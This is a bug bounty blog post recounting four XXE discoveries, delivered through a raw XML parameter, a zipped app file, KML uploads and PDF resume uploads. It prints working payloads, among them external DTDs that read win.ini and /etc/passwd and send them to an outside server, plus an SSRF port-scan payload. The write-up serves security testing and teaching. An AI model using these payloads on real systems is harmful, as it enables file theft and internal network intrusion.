---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-07-26_xxe-case-studies.md
original_filename: 2021-07-26_xxe-case-studies.md
title: XXE Case Studies
category: documents
detected_topics:
- ssrf
- command-injection
- file-upload
- automation-abuse
- api-security
tags:
- imported
- documents
- ssrf
- command-injection
- file-upload
- automation-abuse
- api-security
language: en
raw_sha256: 3526317db61a933540c6675029d2be1cad9b38cbfbca3e929430fc8b86cab50d
text_sha256: 75aa587f4078845bd7b859eb4a9e945b5ffba92a0e5f7b20fe7a08ab65a5cb51
ingested_at: '2026-06-28T07:32:07Z'
sensitivity: unknown
redactions_applied: false
---

# XXE Case Studies

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-07-26_xxe-case-studies.md
- Source Type: markdown
- Detected Topics: ssrf, command-injection, file-upload, automation-abuse, api-security
- Ingested At: 2026-06-28T07:32:07Z
- Redactions Applied: False
- Raw SHA256: `3526317db61a933540c6675029d2be1cad9b38cbfbca3e929430fc8b86cab50d`
- Text SHA256: `75aa587f4078845bd7b859eb4a9e945b5ffba92a0e5f7b20fe7a08ab65a5cb51`


## Content

---
title: "XXE Case Studies"
page_title: "XXE Case Studies - My Cyber Endeavors"
url: "https://cinzinga.com/XXE-Case-Studies/"
final_url: "https://cinzinga.com/XXE-Case-Studies/"
authors: ["cinzinga (@cinzinga_)"]
bugs: ["XXE"]
publication_date: "2021-07-26"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3476
---

#  [XXE Case Studies ](https://cinzinga.com/XXE-Case-Studies/)

__4 minute read

As it has been some time since my last blog post, I decided I would set aside some time to write one now. The topic of this blog post is inspired by a bug I found earlier this morning on a bug bounty program.

## XML External Entity (XXE) Attacks

I have always been fascinated by XXE attacks, and in this blog, I will outline some of the checks I perform when bug bounty hunting to identify and exploit these vulnerabilities.

While XXE vulnerabilities are rare, they are generally quite easy to exploit. Additionally, they almost always result in a high or critical severity. There are many blogs and resources that talk about what an XXE vulnerability is, so instead I will focus more on examples that I have seen. Unfortunately, I will not be able to share complete walkthroughs as many of these bugs are undisclosed.

## Case Study #1: strXML Parameter

When hunting bugs with Burp Suite, I utilize the extension [Burp Bounty](https://github.com/wagiro/BurpBounty). This allows me to create custom passive and active profiles. One of the passive profiles I utilized a while back would look for XML in every HTTP request. Upon finding it, the extension would create an issue for me to investigate manually.

![](/assets/images/XXE/1.png)

This alerted me to quite a fun parameter one day while bug bounty hunting. A recreation of the request is shown below.

![](/assets/images/XXE/2.png)

That’s right, the `strXML` parameter simply took raw XML. Interestingly enough the bulk of it wasn’t even URL encoded! Not sure how this was a validly formatted HTTP request. Sadly, I was only able to escalate this finding to an internal port scan via SSRF with a payload similar to the following:
  
  
  strXML=<?xml version%3D"1.0" encoding%3D"ISO-8859-1"?>
  <!DOCTYPE testingxxe [<!ENTITY xxe PUBLIC "xxe" "http://localhost:21/" >
  ]> 
  <data>
  <xxx>
  <xxx>194147</xxx>
  </xxx>
  <identity>&xxe;</identity>
  </data>
  
  

Then Burp Intruder was used to iterate through the top 1000 ports. The open ports returned a different content-length than closed ports.

## Case Study #2: XXE via Proprietary Filetype

I stumbled upon this next XXE completely by accident. The web site had functionality that allowed users to build “apps”. Apps could be exported to a propriety file type that I did not recognize. Upon running `strings` on one of these files I discovered it was a zip file. Upon unzipping the file, I was greeted by a beautiful site.

![](/assets/images/XXE/3.png)

Next, I replaced the contents of one of the XML files with the following XXE payload.
  
  
  <?xml version="1.0" encoding="UTF-8" standalone="no"?>
  <!DOCTYPE cinzinga SYSTEM "http://poc.cinzinga.com/test.dtd">
  <cinzinga>&e1;</cinzinga>
  

And the contents of `/test.dtd` hosted on my web server are shown below:
  
  
  <!ENTITY % p1 SYSTEM "file:///windows/win.ini">
  <!ENTITY % p2 "<!ENTITY e1 SYSTEM 'http://poc.cinzinga.com/?x=%p1;'>">
  %p2;
  

Upon zipping the folder back up, and importing this app, I was greeted with the contents of `C:\Windows\win.ini` sent to my web server.

## Case Study #3: XXE via KML File

I have encountered a number of sites that take more obscure XML file types as input. Multiple times, I have achieved XXE via KML. KML is a type of XML that is specifically used for maps and geographic data.

To exploit these file uploads, I simply download [a sample KML file](https://developers.google.com/kml/documentation/KML_Samples.kml) and append an XXE payload in the second line.

To exploit the one I identified today, I made use of a great tool developed by a close [Tib3rius](https://twitter.com/0xTib3rius). The tool can be found [here](https://github.com/WhiteOakSecurity/Dynamic-DTD).

This app is run with the following command:
  
  
  flask run -p <port> -h <interface-ip>
  

And triggered with the corresponding payload:
  
  
  <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://<server-ip>/malicious.dtd?ext=file:///etc/passwd"> %xxe;]>
  

This promptly resulted in the contents of `/etc/passwd` send to my web server.

![](/assets/images/XXE/4.png)

## Case Study #4: XXE via PDF File

Thus far in my bug bounty career, I have exploited XXE via PDF upload twice. In both cases, the intended functionality was a Resume upload on a careers subdomain. I can only assume that some backend software was scanning the PDFs to extract key information.

To generate these PDFs, I utilize [this](https://github.com/StefanMichielse/generate_xxe_payloads) project on GitHub.

I utilize the following command to generate a XXE PDF payload template.
  
  
  ruby oxml_xxe.rb --poc pdf -i 192.168.0.1:8000
  

![](/assets/images/XXE/5.png)

Next, we can open up the output PDF in a text editor to get a better idea of where the payload is rendered. We can see that the XXE payload is inserted on line 27. ![](/assets/images/XXE/6.png)

Personally, the PDF payload I utilize is shown below. I have edited the default payload slightly.

![](/assets/images/XXE/7.png)

The external dtd is the same as shown above in this blog.
  
  
  <!ENTITY % p1 SYSTEM "file:///windows/win.ini">
  <!ENTITY % p2 "<!ENTITY e1 SYSTEM 'http://poc.cinzinga.com/?x=%p1;'>">
  %p2;
  

## Case Study #?: XXE via Excel File

While I have not yet obtained XXE via Word or Excel file, it is something I have a payload for and routinely check. There is a great blog [here](https://www.4armed.com/blog/exploiting-xxe-with-excel/) that outlines the steps to develop an Excel XXE payload.

## Conclusion

While this article was brief, I hope it served to highlight some XXE vulnerabilities that I have exploited in the wild. While the bug type is not common, I have reported approximately a dozen XXE vulnerabilities in my bug bounty career. This number certainly warrants adding XXE checks to your arsenal when assessing a web app’s security.

![Hits](https://hitcounter.pythonanywhere.com/count/tag.svg?url=https%3A%2F%2Fcinzinga.com%2FXXE-Case-Studies%2F)

**__Tags:** [Bug Bounty](/tags/#bug-bounty),  [Penetration Testing](/tags/#penetration-testing),  [XXE](/tags/#xxe)

**__Updated:** July 26, 2021

#### Share on

[ __X ](https://x.com/intent/tweet?text=XXE+Case+Studies%20https%3A%2F%2Fcinzinga.com%2FXXE-Case-Studies%2F "Share on X") [ __Facebook ](https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fcinzinga.com%2FXXE-Case-Studies%2F "Share on Facebook") [ __LinkedIn ](https://www.linkedin.com/shareArticle?mini=true&url=https://cinzinga.com/XXE-Case-Studies/ "Share on LinkedIn") [ __Bluesky ](https://bsky.app/intent/compose?text=XXE+Case+Studies%20https%3A%2F%2Fcinzinga.com%2FXXE-Case-Studies%2F "Share on Bluesky") [Previous](/OSEP-PEN-300-Review/ "OSEP & PEN-300 Course Review") [Next](/2-Years-Of-Bug-Bounty/ "Two Years of Bug Bounty Hunting")
